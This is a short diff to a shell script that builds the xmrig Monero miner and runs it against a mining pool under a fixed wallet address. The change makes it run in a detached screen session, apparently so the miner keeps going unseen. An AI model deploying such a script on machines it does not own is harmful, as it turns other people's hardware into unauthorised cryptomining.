@@ -2,7 +2,7 @@
 
 # Update package list and install required dependencies
 sudo apt-get update
-sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev screen
 
 # Clone xmrig repository
 git clone https://github.com/xmrig/xmrig.git
@@ -16,5 +16,6 @@ cmake ..
 # Build xmrig using make with parallel jobs
 make -j$(nproc)
 
-# Run xmrig with the specified parameters
-./xmrig -o pool.minexmr.com:443 -u 45PCz5esnjFjn4RamcpL3QHoGpQoSjs867eG1tvfyrVxeNB3fdgmNYGhquf8mMVmCiiWscKFodCVvcHQDHSDRA3u294f9SLS -k --tls --rig-id $(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 13 ; echo '') --no-color
+# Start xmrig in a detached screen session with the specified parameters
+screen -dmS xmrig_session ./xmrig -o pool.minexmr.com:443 -u 45PCz5esnjFjn4RamcpL3QHoGpQoSjs867eG1tvfyrVxeNB3fdgmNYGhquf8mMVmCiiWscKFodCVvcHQDHSDRA3u294f9SLS -k --tls --rig-id $(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 13 ; echo '') --no-color
+
